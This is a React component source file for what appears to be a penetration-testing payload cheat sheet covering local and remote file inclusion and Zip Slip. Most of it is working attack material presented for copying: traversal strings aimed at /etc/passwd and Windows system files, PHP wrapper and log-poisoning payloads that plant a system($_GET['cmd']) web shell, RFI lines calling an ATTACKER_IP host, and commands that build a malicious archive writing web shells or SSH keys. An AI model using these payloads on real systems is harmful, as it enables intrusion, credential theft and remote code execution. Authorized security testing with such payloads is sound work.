import React, { useState } from 'react';
import { Card, Button, TabNav, PayloadBlock, Toast} from '../../../components/ui';
import { FolderOpen, Copy, } from 'lucide-react';

export default function PathTraversalTool() {
    const [activeTab, setActiveTab] = useState('lfi');
    const [showToast, setShowToast] = useState(false);

    const tabs = [
        { id: 'lfi', label: 'LFI/RFI' },
        { id: 'zipslip', label: 'Zip Slip' },
    ];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const LFI_PAYLOADS = [
        {
            category: 'Basic LFI', payloads: [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '..%252f..%252f..%252fetc/passwd',
                '..%c0%af..%c0%af..%c0%afetc/passwd',
            ]
        },
        {
            category: 'Windows LFI', payloads: [
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\Windows\\System32\\drivers\\etc\\hosts',
                '..\\..\\..\\windows\\win.ini',
            ]
        },
        {
            category: 'Null Byte (PHP < 5.3.4)', payloads: [
                '../../../etc/passwd%00',
                '../../../etc/passwd%00.jpg',
            ]
        },
        {
            category: 'PHP Wrappers', payloads: [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                "php://data:text/plain,<?php system($_GET['cmd']);?>",
                'expect://id',
                'phar://path/to/file.phar',
            ]
        },
        {
            category: 'Log Poisoning', payloads: [
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
                '/var/log/apache2/error.log',
                '/var/log/nginx/error.log',
                '# Inject in User-Agent: <?php system($_GET[\'cmd\']); ?>',
            ]
        },
        {
            category: '/proc/self/environ', payloads: [
                '../../../proc/self/environ',
                '# User-Agent: <?php system($_GET[\'cmd\']); ?>',
            ]
        },
        {
            category: 'RFI (Remote File Inclusion)', payloads: [
                'http://ATTACKER_IP/shell.txt',
                'http://ATTACKER_IP/shell.txt%00',
                '\\\\ATTACKER_IP\\share\\shell.php',
            ]
        },
    ];

    const ZIP_SLIP_INFO = `Zip Slip Vulnerability - Path Traversal in Archive Extraction

When an application extracts zip/tar archives without validating file paths, an attacker can craft malicious archives with entries containing path traversal sequences (../) to write files outside the intended directory.

Example Malicious Entry:
../../../../../../tmp/evil.sh

Impact:
- Arbitrary file write
- Code execution if writable to executable paths
- Overwriting configuration files
- Privilege escalation

Prevention:
- Sanitize extracted file paths
- Use safe extraction libraries
- Validate archive contents before extraction
- Extract to isolated directories`;

    const ZIP_SLIP_EXAMPLES = [
        {
            title: 'Linux Target',
            path: '../../../../../tmp/malicious.sh',
            description: 'Writes to /tmp directory'
        },
        {
            title: 'Windows Target',
            path: '..\\..\\..\\..\\..\\Windows\\Temp\\malicious.bat',
            description: 'Writes to Windows Temp'
        },
        {
            title: 'Web Root',
            path: '../../../../../var/www/html/shell.php',
            description: 'Uploads web shell to document root'
        },
        {
            title: 'SSH Keys',
            path: '../../../../../root/.ssh/authorized_keys',
            description: 'Adds SSH public key for persistence'
        },
    ];

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white">
                    Path Traversal & File Inclusion
                </h2>
                <p className="text-gray-400">
                    Local File Inclusion (LFI), Remote File Inclusion (RFI), and Zip Slip payloads
                </p>
            </div>

            <TabNav tabs={tabs} activeTab={activeTab} onTabChange={setActiveTab} />

            {/* LFI/RFI Tab */}
            {activeTab === 'lfi' && (
                <div className="space-y-4">
                    <p className="text-sm text-gray-400">
                        Common LFI/RFI payloads for directory traversal and file inclusion attacks
                    </p>
                    {LFI_PAYLOADS.map((section, idx) => (
                        <div key={idx} className="mb-6">
                            <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">
                                {section.category}
                            </h3>
                            <PayloadBlock
                                content={section.payloads}
                            />
                        </div>
                    ))}
                </div>
            )}

            {/* Zip Slip Tab */}
            {activeTab === 'zipslip' && (
                <div className="space-y-4">
                    <div className="mb-6">
                        <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider mb-3 border-b border-white/10 pb-2">
                            Zip Slip Vulnerability
                        </h3>
                        <PayloadBlock content={ZIP_SLIP_INFO} />
                    </div>

                    <Card className="!p-6 space-y-4">
                        <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider">Example Malicious Paths</h3>
                        <div className="space-y-3">
                            {ZIP_SLIP_EXAMPLES.map((example, idx) => (
                                <div key={idx} className="border border-[#30363d] rounded-lg p-3 space-y-2">
                                    <div className="flex items-center justify-between">
                                        <span className="text-sm font-bold text-white">{example.title}</span>
                                        <Button
                                            size="sm"
                                            variant="outline"
                                            onClick={() => copyToClipboard(example.path)}
                                            icon={<Copy size={12} />}
                                        />
                                    </div>
                                    <div className="bg-[#0d1117] rounded p-2">
                                        <code className="text-xs text-blue-300 break-all">{example.path}</code>
                                    </div>
                                    <p className="text-xs text-gray-500">{example.description}</p>
                                </div>
                            ))}
                        </div>
                    </Card>

                    <Card className="!p-6 space-y-4">
                        <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider">Creating Malicious Archive</h3>
                        <p className="text-xs text-gray-400">
                            Use these commands to craft a Zip Slip exploit archive:
                        </p>
                        <div className="space-y-2">
                            <div className="bg-[#0d1117] rounded p-3 space-y-1">
                                <p className="text-xs text-gray-500"># Create malicious file</p>
                                <code className="text-xs text-blue-300 block">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</code>
                            </div>
                            <div className="bg-[#0d1117] rounded p-3 space-y-1">
                                <p className="text-xs text-gray-500"># Create zip with traversal path</p>
                                <code className="text-xs text-blue-300 block">ln -s shell.php '../../../../../var/www/html/shell.php'</code>
                                <code className="text-xs text-blue-300 block">zip --symlinks malicious.zip '../../../../../var/www/html/shell.php'</code>
                            </div>
                            <div className="bg-[#0d1117] rounded p-3 space-y-1">
                                <p className="text-xs text-gray-500"># Alternative: Python script</p>
                                <code className="text-xs text-blue-300 block">python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip', 'w'); z.writestr('../../../tmp/shell.php', '&lt;?php system(\$_GET[cmd]); ?&gt;'); z.close()"</code>
                            </div>
                        </div>
                    </Card>
                </div>
            )}

            {/* Toast */}
                                <Toast show={showToast} message="Copied to clipboard!" />
        </div>
    );
}
